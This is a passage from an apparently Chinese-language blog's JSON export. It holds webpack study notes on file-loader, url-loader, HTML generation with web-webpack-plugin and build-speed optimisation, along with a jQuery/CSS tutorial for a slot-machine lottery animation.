'./imgs/b.png';window.document.getElementById('app').innerHTML = `&lt;img src=\"$&#123;imgB&#125;\"/&gt; 经过 file-loader 处理后输出的 JavaScript 代码如下： 1module.exports = __webpack_require__.p + \"0bcc1f8d385f78e1271ebfca50668429.png\"; 也就是说 imgB 的值就是图片对应的 URL 地址。 在 Webpack 中使用 file-loader 非常简单，相关配置如下： 12345678910module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.png$/, use: ['file-loader'] &#125; ] &#125;&#125;; 使用 url-loaderurl-loader 可以把文件的内容经过 base64 编码后注入到 JavaScript 或者 CSS 中去。 例如 CSS 源码是这样写的： 123#app &#123; background-image: url(./imgs/a.png);&#125; 被 url-loader 转换后输出的 CSS 会变成这样： 123#app &#123; background-image: url(data:image/png;base64,iVBORw01afer...); /* 结尾省略了剩下的 base64 编码后的数据 */&#125; 同理在 JavaScript 中效果也类似。 从上面的例子中可以看出 url-loader 会把根据图片内容计算出的 base64 编码的字符串直接注入到代码中，由于一般的图片数据量巨大， 这会导致 JavaScript、CSS 文件也跟着变大。 所以在使用 url-loader 时一定要注意图片体积不能太大，不然会导致 JavaScript、CSS 文件过大而带来的网页加载缓慢问题。 一般利用 url-loader 把网页需要用到的小图片资源注入到代码中去，以减少加载次数。因为在 HTTP/1 协议中，每加载一个资源都需要建立一次 HTTP 链接， 为了一个很小的图片而新建一次 HTTP 连接是不划算的。 url-loader 考虑到了以上问题，并提供了一个方便的选择 limit，该选项用于控制当文件大小小于 limit 时才使用 url-loader，否则使用 fallback 选项中配置的 loader。 相关 Webpack 配置如下： 123456789101112131415161718module.exports = &#123; module: &#123; rules: [ &#123; test: /\\.png$/, use: [&#123; loader: 'url-loader', options: &#123; // 30KB 以下的文件采用 url-loader limit: 1024 * 30, // 否则采用 file-loader，默认值就是 file-loader fallback: 'file-loader', &#125; &#125;] &#125; ] &#125;,&#125;; webpack打包后的图片无法显示问题之前做react项目的时候遇到过这种问题，项目打包后页面图片加载有问题，打开控制台看到类似这样的错误webpack要将图片进行打包，需要安装儒url-loader加载器，加载器有个默认的设置选项limit：8196，当你的图片大小不超过8kb的时候，打包的时候会生成base64位的图片地址，这种情况下背景图片可以正常显示，当你图片大小超过limit设置的限制时，它会生成一个静态资源图片 打包后的图片一般会存放在dist文件夹下，但是由于某种原因（暂时不知道什么原因），打包后的代码引用的资源地址依然是没有打包之前的那个地址，那自然就会报错。 解决方案1：将limit这个配置变大或者注释掉，都以base64位的地址显示图片解决方案2：在webpack.config.js中添加配置： 为单页应用生成HTML截止到目前，我们的hello，webpack例子在构建时会输出一个bundle.js文件，而要想访问页面必须首先更改html文件当中script文件的引入路径，然后打开这个html文件 不仅如此，实际的项目其实远比我们这个例子复杂得多，例如： 项目采用 ES6 语言加 React 框架。 给页面加入 Google Analytics，这部分代码需要内嵌进 HEAD 标签里去。 给页面加入 Disqus 用户评论，这部分代码需要异步加载以提升首屏加载速度。 压缩和分离 JavaScript 和 CSS 代码，提升加载速度。 在开始前先来看看该应用最终发布到线上的代码： 12345678910111213141516171819202122232425&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;!--注入 Chunk app 依赖的 CSS--&gt; &lt;style rel=\"stylesheet\"&gt;h1&#123;color:red&#125;&lt;/style&gt; &lt;!--内嵌 google_analytics 中的 JavaScript 代码--&gt; &lt;script&gt;(function(i,s,o,g,r,a,m)&#123;i['GoogleAnalyticsObject']=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)&#125;)(window,document,'script','https://www.google-analytics.com/analytics.js','ga');ga('create', 'UA-XXXXX-Y', 'auto');ga('send', 'pageview'); &lt;/script&gt; &lt;!--异步加载 Disqus 评论--&gt; &lt;script async=\"\" src=\"https://dive-into-webpack.disqus.com/embed.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"app\"&gt;&lt;/div&gt;&lt;!--导入 app 依赖的 JS--&gt;&lt;script src=\"app_746f32b2.js\"&gt;&lt;/script&gt;&lt;!--Disqus 评论容器--&gt;&lt;div id=\"disqus_thread\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HTML 应该是被压缩过的，这里为了方便大家阅读而格式化了 HTML，并且加入了注释。 构建出的目录结构为： dist├── app_792b446e.js└── index.html 可以看到部分代码被内嵌进了 HTML 的 HEAD 标签中，部分文件的文件名称被打上根据文件内容算出的 Hash 值，并且加载这些文件的 URL 地址也被正常的注入到了 HTML 中。 如果你还采用手写 index.html 文件去完成以上要求，这就会使工作变得复杂、易错，项目难以维护。 本节教你如何自动化的生成这个符合要求的 index.html。 解决方案推荐一个用于方便的解决以上问题的 Webpack 插件 web-webpack-plugin。 该插件已经被社区上许多人使用和验证，解决了大家的痛点获得了很多好评，下面具体介绍如何用它来解决上面的问题。 首先，修改 Webpack 配置为如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667const path = require('path');const UglifyJsPlugin = require('webpack/lib/optimize/UglifyJsPlugin');const ExtractTextPlugin = require('extract-text-webpack-plugin');const DefinePlugin = require('webpack/lib/DefinePlugin');const &#123; WebPlugin &#125; = require('web-webpack-plugin');module.exports = &#123; // 此时的entry必须写成这样的对象形式 entry: &#123; main: './main.js'// app 的 JavaScript 执行入口文件 &#125;, output: &#123; filename: '[name]_[chunkhash:8].js',// 给输出的文件名称加上 Hash 值 path: path.resolve(__dirname, './dist'), &#125;, module: &#123; rules: [ &#123; test: /\\.js$/, use: ['babel-loader'], // 排除 node_modules 目录下的文件， // 该目录下的文件都是采用的 ES5 语法，没必要再通过 Babel 去转换 exclude: path.resolve(__dirname, 'node_modules'), &#125;, &#123; test: /\\.css$/,// 增加对 CSS 文件的支持 // 提取出 Chunk 中的 CSS 代码到单独的文件中 use: ExtractTextPlugin.extract(&#123; use: ['css-loader?minimize'] // 压缩 CSS 代码 &#125;), &#125;, ] &#125;, plugins: [ // 使用本文的主角 WebPlugin，一个 WebPlugin 对应一个 HTML 文件 new WebPlugin(&#123; template: './template.html', // HTML 模版文件所在的文件路径 filename: 'index.html' // 输出的 HTML 的文件名称 &#125;), new ExtractTextPlugin(&#123; filename: `[name]_[contenthash:8].css`,// 给输出的 CSS 文件名称加上 Hash 值 &#125;), new DefinePlugin(&#123; // 定义 NODE_ENV 环境变量为 production，以去除源码中只有开发时才需要的部分 'process.env': &#123; NODE_ENV: JSON.stringify('production') &#125; &#125;), // 压缩输出的 JavaScript 代码 new UglifyJsPlugin(&#123; // 最紧凑的输出 beautify: false, // 删除所有的注释 comments: false, compress: &#123; // 在UglifyJs删除没有用到的代码时不输出警告 warnings: false, // 删除所有的 `console` 语句，可以兼容ie浏览器 drop_console: true, // 内嵌定义了但是只用到一次的变量 collapse_vars: true, // 提取出出现多次但是没有定义成变量去引用的静态值 reduce_vars: true, &#125; &#125;), ],&#125;; 以上配置中，大多数都是按照前面已经讲过的内容增加的配置，例如： 增加对 CSS 文件的支持，提取出 Chunk 中的 CSS 代码到单独的文件中，压缩 CSS 文件； 定义 NODE_ENV 环境变量为 production，以去除源码中只有开发时才需要的部分； 给输出的文件名称加上 Hash 值； 压缩输出的 JavaScript 代码。 但最核心的部分在于 plugins 里的： 1234new WebPlugin(&#123; template: './template.html', // HTML 模版文件所在的文件路径 filename: 'index.html' // 输出的 HTML 的文件名称&#125;) 其中 template: ‘./template.html’ 所指的模版文件 template.html 的内容是： 123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;!--注入 Chunk app 中的 CSS--&gt; &lt;link rel=\"stylesheet\" href=\"main?_inline\"&gt; &lt;!--注入 google_analytics 中的 JavaScript 代码--&gt; &lt;script src=\"./google_analytics.js?_inline\"&gt;&lt;/script&gt; &lt;!--异步加载 Disqus 评论--&gt; &lt;script src=\"https://dive-into-webpack.disqus.com/embed.js\" async&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=\"app\"&gt;&lt;/div&gt;&lt;!--导入 Chunk app 中的 JS--&gt;&lt;script src=\"main\"&gt;&lt;/script&gt;&lt;!--Disqus 评论容器--&gt;&lt;div id=\"disqus_thread\"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 该文件描述了哪些资源需要被以何种方式加入到输出的 HTML 文件中。 以 &lt;link rel=&quot;stylesheet&quot; href=&quot;app?_inline&quot;&gt; 为例，按照正常引入 CSS 文件一样的语法来引入 Webpack 生产的代码。 href 属性中的 app?_inline 可以分为两部分，前面的 app 表示 CSS 代码来自名叫 app 的 Chunk 中，后面的 _inline 表示这些代码需要被内嵌到这个标签所在的位置。 同样的 &lt;script src=&quot;./google_analytics.js?_inline&quot;&gt;&lt;/script&gt; 表示 JavaScript 代码来自相对于当前模版文件 template.html 的本地文件 ./google_analytics.js， 而且文件中的 JavaScript 代码也需要被内嵌到这个标签所在的位置。 也就是说资源链接 URL 字符串里问号前面的部分表示资源内容来自哪里，后面的 querystring 表示这些资源注入的方式。 除了 _inline 表示内嵌外，还支持以下属性： _dist 只有在生产环境下才引入该资源 _dev 只有在开发环境下才引入该资源 _ie 只有IE浏览器才需要引入的资源，通过 [if IE]&gt;resource&lt;![endif] 注释实现这些属性之间可以搭配使用，互不冲突。例如 app?_inline&amp;_dist 表示只在生产环境下才引入该资源，并且需要内嵌到 HTML 里去。 WebPlugin 插件还支持一些其它更高级的用法，详情可以访问该项目主页阅读文档。","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"webpack","slug":"技术/前端/webpack","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/webpack/"}],"tags":[]},{"title":"JQ-CSS实现老虎机抽奖效果","slug":"JQ-CSS实现老虎机抽奖效果","date":"2020-08-06T16:00:00.000Z","updated":"2024-05-25T04:21:29.805Z","comments":true,"path":"2020/08/07/JQ-CSS实现老虎机抽奖效果/","link":"","permalink":"https://wtaufpziv.github.io/2020/08/07/JQ-CSS%E5%AE%9E%E7%8E%B0%E8%80%81%E8%99%8E%E6%9C%BA%E6%8A%BD%E5%A5%96%E6%95%88%E6%9E%9C/","excerpt":"介绍现在不少app都会有一些抽奖活动，热门的抽奖当属九宫格循环抽奖，而还有一种抽奖形式也是比较常见，比如老虎机的形式 预期效果那么我们就用JQ和CSS实现一下这个效果。","text":"介绍现在不少app都会有一些抽奖活动，热门的抽奖当属九宫格循环抽奖，而还有一种抽奖形式也是比较常见，比如老虎机的形式 预期效果那么我们就用JQ和CSS实现一下这个效果。 简单的实现思路其实这个效果和实现一个轮播图是有异曲同工之妙的 假设现在有1，2，3三个奖品，我们可以在一个ul内使用多个序列拼接成一个长列表:1–2–3–1–2–3–1–2–3–1–2–3…..以此类推 每一组1–2–3视为一个集合，抽奖开始从第一个集合的某个奖品开始，到最后一个集合的某个奖品结束，中间使用transition加transform实现动效。 当每一次抽奖动效完成后ul会挺在最后一个集合的元素上，这个时候就需要让ul‘瞬移’一下，移动到当前这个奖项对应的第一个集合中的奖项，以便下一次抽奖 有了这个大概的思路，就可以着手于实现了 先定义一下DOM结构我们实现的是上文提到的那个例子，但是为了简洁，我们的dom结构就先定义简单一点 12345678910111213141516171819202122&lt;div class=\"game-content\"&gt; &lt;div class=\"game-goods-wrap\"&gt; &lt;div class=\"game-goods-list\"&gt; &lt;div class=\"game-goods\" style=\"background: #ffffff;\"&gt; &lt;div class=\"game-goods-box\" id=\"game1\"&gt; &lt;ul class=\"game-goods-ul\"&gt;&lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"game-goods\" style=\"background: #ffffff;\"&gt; &lt;div class=\"game-goods-box\" id=\"game2\"&gt; &lt;ul class=\"game-goods-ul\"&gt;&lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=\"game-goods\" style=\"background: #ffffff;\"&gt; &lt;div class=\"game-goods-box\" id=\"game3\"&gt; &lt;ul class=\"game-goods-ul\"&gt;&lt;/ul&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;span class=\"game-btn\"&gt;&lt;/span&gt;&lt;/div&gt; 核心动效的实现然后我们开始书写核心动效实现的封装函数，对外提供可以配置的接口option： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178luckGame: function(options) &#123; var defaults = &#123; 'gameLen': '10', // 奖品的数量 'game_pagesize': 6,//生成多少圈同样的东西，调节速度用 'zj_arr': &#123; //中奖数组，第一个表示是否中奖，第二个中奖号码 'is_win':1, 'number':8 &#125; &#125;; var settings = Object.assgin(defaults, options); w_config=&#123; 'w':$(window).width(), 'h':$(window).height() &#125; var gameArr=[]; // 奖品滚动的列表 var gameLen=settings.gameLen; // 奖品的种类数量 var game_list_h=''; // 奖品滚动列表的高度 var game_init=[]; // 页面载入时随机的选择状态 var game_list_item_h=0; // 单个奖品元素的高度 //每次进来随机3个数字，来启动当前的选择的状态 for (var i = 0; i &lt; 3; i++) &#123; game_init.push(Math.floor(Math.random() * gameLen)); &#125; createGame(); $(window).resize(function()&#123; createGame(); &#125;) // 初始化游戏 function createGame()&#123; getHeight(); setLi(); pushLi(gameArr); start(); &#125; function getHeight()&#123; w_config=&#123; 'w':$(window).width(), 'h':$(window).height() &#125; // 由于抽奖机本身的大小根据屏幕大小自适应，所以奖品高度需要计算 // 实际场景下一般都是定高的 game_list_item_h=(w_config.w*320/750*0.5*0.7).toFixed(2); &#125; //设置奖品 function setLi()&#123; // 拼接实际的滚动数组 for (var j = 1; j &lt;= settings.game_pagesize; j++) &#123; for (var i = 1; i &lt;= gameLen; i++) &#123; gameArr.push(&#123;'type':j,'index':i,'src':'images/'+i+'.png'&#125;); &#125; &#125; &#125; //写入，初始化奖品的滚动 function pushLi(arr)&#123; var html_str=''; // 根据滚动数组生成li for (var i = 0; i &lt; arr.length; i++) &#123; html_str+='&lt;li style=\"height:'+game_list_item_h+'px\" data-index=\"' + arr[i]['index']+'\" data-type=\"'+arr[i]['type']+'\"&gt;&lt;img src=\"' + arr[i]['src']+'\"&gt;&lt;/li&gt;'; &#125; $(\".game-goods-ul\").each(function(e)&#123; $(this).empty().append(html_str); game_list_h=$(this).height(); console.log('game_list_item_h',game_init); y=game_list_item_h*game_init[e]; $(this).css(&#123; 'transition-duration': '0ms', 'transform':'translate(0px, -'+y+'px) translateZ(0px)' &#125;) &#125;); &#125; // 开始抽奖 function start()&#123; // 这一块是点击开始动效 // 但实际场景中一般是点击之后和后台进行交互 // 获取到中奖信息之后直接开始动效 // 组件本身不负责点击事件 $(\".game-btn\").click(function()&#123; //如果中奖 if(settings.zj_arr.is_win==1) &#123; $(\".game-goods-ul\").each(function(e)&#123; setTimeout(function()&#123; y=(settings.zj_arr.number+settings.gameLen*(settings.game_pagesize-1))*game_list_item_h; $(\".game-goods-ul\").eq(e).css(&#123; 'transition-duration': '5000ms', 'transform':'translate(0px, -'+y+'px) translateZ(0px)' &#125;) &#125;, e*300); // 判断最后面是否完毕 // 抽奖动画完成后回到type=1的地方，等待下一次抽奖 $(\"#game3\").find(\".game-goods-ul\").on(\"webkitTransitionEnd\", function() &#123; y=settings.zj_arr.number*game_list_item_h; $(\".game-goods-ul\").css(&#123; 'transition-duration': '0ms', 'transform':'translate(0px, -'+y+'px) translateZ(0px)' &#125;) $(\"#game3\").find(\".game-goods-ul\").unbind(\"webkitTransitionEnd\"); &#125;) &#125;) &#125;else &#123; // 不中奖的时候哦生成随记停留的奖项，但是确保不能三个奖项一样 numrand=randNum2(); console.log(numrand); // 不中奖的时候 $(\".game-goods-ul\").each(function(e)&#123; y2=(numrand[0])*game_list_item_h; y3=(numrand[1])*game_list_item_h; y4=(numrand[2])*game_list_item_h; setTimeout(function()&#123; y=(numrand[e]+settings.gameLen*(settings.game_pagesize-1))*game_list_item_h; $(\".game-goods-ul\").eq(e).css(&#123; 'transition-duration': '5000ms', 'transform':'translate(0px, -'+y+'px) translateZ(0px)' &#125;) &#125;, e*300); //判断最后面是否完毕 // 抽奖动画完成后回到type=1的地方，等待下一次抽奖 $(\"#game3\").find(\".game-goods-ul\").on(\"webkitTransitionEnd\", function() &#123; $(\".game-goods-ul\").eq(2).css(&#123; 'transition-duration': '00ms', 'transform':'translate(0px, -'+y4+'px) translateZ(0px)' &#125;) $(\"#game3\").find(\".game-goods-ul\").unbind(\"webkitTransitionEnd\"); &#125;) $(\"#game2\").find(\".game-goods-ul\").on(\"webkitTransitionEnd\", function() &#123; $(\".game-goods-ul\").eq(1).css(&#123; 'transition-duration': '00ms', 'transform':'translate(0px, -'+y3+'px) translateZ(0px)' &#125;) $(\"#game2\").find(\".game-goods-ul\").unbind(\"webkitTransitionEnd\"); &#125;) $(\"#game1\").find(\".game-goods-ul\").on(\"webkitTransitionEnd\", function() &#123; $(\".game-goods-ul\").eq(0).css(&#123; 'transition-duration': '00ms', 'transform':'translate(0px, -'+y2+'px) translateZ(0px)' &#125;) $(\"#game1\").find(\".game-goods-ul\").unbind(\"webkitTransitionEnd\"); &#125;) &#125;) &#125; &#125;) &#125; // 生成不中奖时候的随机显示序列 function randNum2()&#123; a=Math.floor(Math.random() * gameLen); b=Math.floor(Math.random() * gameLen); c=Math.floor(Math.random() * gameLen); arr=[]; if(a==b) &#123; return randNum2(); &#125;else &#123; return arr=[a,b,c]; &#125; &#125;&#125; 调用然后我们就可以像这样传入配置，这一块实际场景中是点击按钮过后再传入配置，当配置传入之后调用函数，直接开始动画： 12345678luckGame(&#123; 'zj_arr': &#123; 'is_win':1, 'number':9//从0算起，就是10了 &#125;, gameLen:10,//产品抽奖数量， game_pagesize:6&#125;); 以上就是核心的动效实现，如果是使用vue或者react之类的框架，那么我们则只需要关注数据本身就行，由数据去驱动视图，省去了繁杂的DOM操作，整个过程会更加简洁。","categories":[],"tags":[]},{"title":"深入浅出-Webpack学习笔记（四）——优化·上","slug":"深入浅出-Webpack学习笔记（四）——优化·上","date":"2020-08-02T16:00:00.000Z","updated":"2024-05-25T04:21:29.340Z","comments":true,"path":"2020/08/03/深入浅出-Webpack学习笔记（四）——优化·上/","link":"","permalink":"https://wtaufpziv.github.io/2020/08/03/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA-Webpack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E4%BC%98%E5%8C%96%C2%B7%E4%B8%8A/","excerpt":"了解了webpack的一些基本使用方法，我们就开始需要着手于一些优化点了。 webpack优化可以分为优化开发体验和优化输出质量两部分，那么接下来就深入学习一下webpack的优化。 优化开发体验优化开发体验的目的是为了提升开发时的效率，其中又可以分为以下几点： 优化构建速度。在项目庞大时构建耗时可能会变的很长，每次等待构建的耗时加起来也会是个大数目。 优化使用体验。通过自动化手段完成一些重复的工作，让我们专注于解决问题本身。 优化输出质量优化输出质量的目的是为了给用户呈现体验更好的网页，例如减少首屏加载时间、提升性能流畅度等。 这至关重要，因为在互联网行业竞争日益激烈的今天，这可能关系到你的产品的生死。 优化输出质量本质是优化构建输出的要发布到线上的代码，分为以下几点： 减少用户能感知到的加载时间，也就是首屏加载时间。 提升流畅度，也就是提升代码性能。 优化的关键是找出问题所在，这样才能一针见血， 输出分析 教你如何利用工具快速找出问题所在。","text":"了解了webpack的一些基本使用方法，我们就开始需要着手于一些优化点了。 webpack优化可以分为优化开发体验和优化输出质量两部分，那么接下来就深入学习一下webpack的优化。 优化开发体验优化开发体验的目的是为了提升开发时的效率，其中又可以分为以下几点： 优化构建速度。在项目庞大时构建耗时可能会变的很长，每次等待构建的耗时加起来也会是个大数目。 优化使用体验。通过自动化手段完成一些重复的工作，让我们专注于解决问题本身。 优化输出质量优化输出质量的目的是为了给用户呈现体验更好的网页，例如减少首屏加载时间、提升性能流畅度等。 这至关重要，因为在互联网行业竞争日益激烈的今天，这可能关系到你的产品的生死。 优化输出质量本质是优化构建输出的要发布到线上的代码，分为以下几点： 减少用户能感知到的加载时间，也就是首屏加载时间。 提升流畅度，也就是提升代码性能。 优化的关键是找出问题所在，这样才能一针见血， 输出分析 教你如何利用工具快速找出问题所在。 缩小文件搜索范围Webpack 启动后会从配置的 Entry 出发，解析出文件中的导入语句，再递归的解析。 在遇到导入语句时 Webpack 会做两件事情： 根据导入语句去寻找对应的要导入的文件。例如 require(‘react’) 导入语句对应的文件是 ./node_modules/react/react.js，require(‘./util’) 对应的文件是 ./util.js。 根据找到的要导入文件的后缀，使用配置中的 Loader 去处理文件。例如使用 ES6 开发的 JavaScript 文件需要使用 babel-loader 去处理。 以上两件事情虽然对于处理一个文件非常快，但是当项目大了以后文件量会变的非常多，这时候构建速度慢的问题就会暴露出来。 虽然以上两件事情无法避免，但需要尽量减少以上两件事情的发生，以提高速度。 接下来一一介绍可以优化它们的途径。 优化 loader 配置由于 Loader 对文件的转换操作很耗时，需要让尽可能少的文件被 Loader 处理。 在2-3 Module 中介绍过在使用 Loader 时可以通过 test 、 include 、 exclude 三个配置项来命中 Loader 要应用规则的文件。 为了尽可能少的让文件被 Loader 处理，可以通过 include 去命中只有哪些文件需要被处理。 以采用 ES6 的项目为例，在配置 babel-loader 时，可以这样： 1234567891011121314module.exports = &#123; module: &#123; rules: [ &#123; // 如果项目源码中只有 js 文件就不要写成 /\\.jsx?$/，提升正则表达式性能 test: /\\.js$/, // babel-loader 支持缓存转换出的结果，通过 cacheDirectory 选项开启 use: ['babel-loader?cacheDirectory'], // 只对项目根目录下的 src 目录中的文件采用 babel-loader include: path.resolve(__dirname, 'src'), &#125;, ] &#125;,&#125;; 你可以适当的调整项目的目录结构，以方便在配置 Loader 时通过 include 去缩小命中范围。 优化 resolve.modules 配置在2-4 Resolve 中介绍过 resolve.modules 用于配置 Webpack 去哪些目录下寻找第三方模块。 resolve.modules 的默认值是 [‘node_modules’]，含义是先去当前目录下的 ./node_modules 目录下去找想找的模块，如果没找到就去上一级目录 ../node_modules 中找，再没有就去 ../../node_modules 中找，以此类推，这和 Node.js 的模块寻找机制很相似。 当安装的第三方模块都放在项目根目录下的 ./node_modules 目录下时，没有必要按照默认的方式去一层层的寻找，可以指明存放第三方模块的绝对路径，以减少寻找，配置如下： 12345678module.exports = &#123; resolve: &#123; // 使用绝对路径指明第三方模块存放的位置，以减少搜索步骤 // 其中 __dirname 表示当前工作目录，也就是项目根目录 // modules: ['node_modules'] modules: [path.resolve(__dirname, 'node_modules')] &#125;,&#125;; 优化 resolve.mainFields 配置在2-4 Resolve 中介绍过 resolve.mainFields 用于配置第三方模块使用哪个入口文件。 安装的第三方模块中都会有一个 package.json 文件用于描述这个模块的属性，其中有些字段用于描述入口文件在哪里，resolve.mainFields 用于配置采用哪个字段作为入口文件的描述。 可以存在多个字段描述入口文件的原因是因为有些模块可以同时用在多个环境中，针对不同的运行环境需要使用不同的代码。 以 isomorphic-fetch 为例，它是 fetch API 的一个实现，但可同时用于浏览器和 Node.js 环境。 它的 package.json 中就有2个入口文件描述字段： 1234&#123; \"browser\": \"fetch-npm-browserify.js\", \"main\": \"fetch-npm-node.js\"&#125; isomorphic-fetch 在不同的运行环境下使用不同的代码是因为 fetch API 的实现机制不一样，在浏览器中通过原生的 fetch 或者 XMLHttpRequest 实现，在 Node.js 中通过 http 模块实现。 resolve.mainFields 的默认值和当前的 target 配置有关系，对应关系如下： 当 target 为 web 或者 webworker 时，值是 [“browser”, “module”, “main”]当 target 为其它情况时，值是 [“module”, “main”]以 target 等于 web 为例，Webpack 会先采用第三方模块中的 browser 字段去寻找模块的入口文件，如果不存在就采用 module 字段，以此类推。 为了减少搜索步骤，在你明确第三方模块的入口文件描述字段时，你可以把它设置的尽量少。 由于大多数第三方模块都采用 main 字段去描述入口文件的位置，可以这样配置 Webpack： 123456module.exports = &#123; resolve: &#123; // 只采用 main 字段作为入口文件描述字段，以减少搜索步骤 mainFields: ['main'], &#125;,&#125;; 使用本方法优化时，你需要考虑到所有运行时依赖的第三方模块的入口文件描述字段，就算有一个模块搞错了都可能会造成构建出的代码无法正常运行。 优化 resolve.alias 配置在2-4 Resolve 中介绍过 resolve.alias 配置项通过别名来把原导入路径映射成一个新的导入路径。 在实战项目中经常会依赖一些庞大的第三方模块，以 React 库为例，安装到 node_modules 目录下的 React 库的目录结构如下： ├── dist│ ├── react.js│ └── react.min.js├── lib│ … 还有几十个文件被忽略│ ├── LinkedStateMixin.js│ ├── createClass.js│ └── React.js├── package.json└── react.js可以看到发布出去的 React 库中包含两套代码： 一套是采用 CommonJS 规范的模块化代码，这些文件都放在 lib 目录下，以 package.json 中指定的入口文件 react.js 为模块的入口。一套是把 React 所有相关的代码打包好的完整代码放到一个单独的文件中，这些代码没有采用模块化可以直接执行。其中 dist/react.js 是用于开发环境，里面包含检查和警告的代码。dist/react.min.js 是用于线上环境，被最小化了。默认情况下 Webpack 会从入口文件 ./node_modules/react/react.js 开始递归的解析和处理依赖的几十个文件，这会时一个耗时的操作。 通过配置 resolve.alias 可以让 Webpack 在处理 React 库时，直接使用单独完整的 react.min.js 文件，从而跳过耗时的递归解析操作。 相关 Webpack 配置如下： module.exports = { 123456789 resolve: &#123; // 使用 alias 把导入 react 的语句换成直接使用单独完整的 react.min.js 文件， // 减少耗时的递归解析操作 alias: &#123; 'react': path.resolve(__dirname, './node_modules/react/dist/react.min.js'), // react15 // 'react': path.resolve(__dirname, './node_modules/react/umd/react.production.min.js'), // react16 &#125; &#125;,&#125;; 除了 React 库外，大多数库发布到 Npm 仓库中时都会包含打包好的完整文件，对于这些库你也可以对它们配置 alias。 但是对于有些库使用本优化方法后会影响到后面要讲的使用 Tree-Shaking去除无效代码的优化，因为打包好的完整文件中有部分代码你的项目可能永远用不上。一般对整体性比较强的库采用本方法优化，因为完整文件中的代码是一个整体，每一行都是不可或缺的。但是对于一些工具类的库，比如lodash，你的项目可能只用到了其中几个工具函数，你就不能使用本方法去优化，因为这会导致你的输出代码中包含很多永远不会执行的代码。 优化 resolve.extensions 配置在导入语句没带文件后缀时，Webpack 会自动带上后缀后去尝试询问文件是否存在。 在2-4 Resolve 中介绍过 resolve.extensions 用于配置在尝试过程中用到的后缀列表，默认是： extensions: [‘.js’, ‘.json’]也就是说当遇到 require(‘./data’) 这样的导入语句时，Webpack 会先去寻找 ./data.js 文件，如果该文件不存在就去寻找 ./data.json 文件，如果还是找不到就报错。 如果这个列表越长，或者正确的后缀在越后面，就会造成尝试的次数越多，所以 resolve.extensions 的配置也会影响到构建的性能。 在配置 resolve.extensions 时你需要遵守以下几点，以做到尽可能的优化构建性能： 后缀尝试列表要尽可能的小，不要把项目中不可能存在的情况写到后缀尝试列表中。 频率出现最高的文件后缀要优先放在最前面，以做到尽快的退出寻找过程。 在源码中写导入语句时，要尽可能的带上后缀，从而可以避免寻找过程。例如在你确定的情况下把 require(‘./data’) 写成 require(‘./data.json’)。 相关 Webpack 配置如下： 123456module.exports = &#123; resolve: &#123; // 尽可能的减少后缀尝试的可能性 extensions: ['js'], &#125;,&#125;; 优化 module.noParse 配置在2-3 Module 中介绍过 module.noParse 配置项可以让 Webpack 忽略对部分没采用模块化的文件的递归解析处理，这样做的好处是能提高构建性能。 原因是一些库，例如 jQuery 、ChartJS， 它们庞大又没有采用模块化标准，让 Webpack 去解析这些文件耗时又没有意义。 在上面的 优化 resolve.alias 配置 中讲到单独完整的 react.min.js 文件就没有采用模块化，让我们来通过配置 module.noParse 忽略对 react.min.js 文件的递归解析处理， 相关 Webpack 配置如下： 12345678const path = require('path');module.exports = &#123; module: &#123; // 独完整的 `react.min.js` 文件就没有采用模块化，忽略对 `react.min.js` 文件的递归解析处理 noParse: [/react\\.min\\.js$/], &#125;,&#125;; 注意被忽略掉的文件里不应该包含 import 、 require 、 define 等模块化语句，不然会导致构建出的代码中包含无法在浏览器环境下执行的模块化语句。 以上就是所有和缩小文件搜索范围相关的构建性能优化了，在根据自己项目的需要去按照以上方法改造后，你的构建速度一定会有所提升。 使用 DllPlugin认识 DLL在介绍 DllPlugin 前先给大家介绍下 DLL。 用过 Windows 系统的人应该会经常看到以 .dll 为后缀的文件，这些文件称为动态链接库，在一个动态链接库中可以包含给其他模块调用的函数和数据。 要给 Web 项目构建接入动态链接库的思想，需要完成以下事情： 把网页依赖的基础模块抽离出来，打包到一个个单独的动态链接库中去。一个动态链接库中可以包含多个模块。当需要导入的模块存在于某个动态链接库中时，这个模块不能被再次被打包，而是去动态链接库中获取。 页面依赖的所有动态链接库需要被加载。 为什么给 Web 项目构建接入动态链接库的思想后，会大大提升构建速度呢？ 原因在于包含大量复用模块的动态链接库只需要编译一次，在之后的构建过程中被动态链接库包含的模块将不会在重新编译，而是直接使用动态链接库中的代码。 由于动态链接库中大多数包含的是常用的第三方模块，例如 react、react-dom，只要不升级这些模块的版本，动态链接库就不用重新编译。 接入 WebpackWebpack 已经内置了对动态链接库的支持，需要通过2个内置的插件接入，它们分别是： DllPlugin 插件：用于打包出一个个单独的动态链接库文件。 DllReferencePlugin 插件：用于在主要配置文件中去引入 DllPlugin 插件打包好的动态链接库文件。下面以基本的 React 项目为例，为其接入 DllPlugin，在开始前先来看下最终构建出的目录结构： 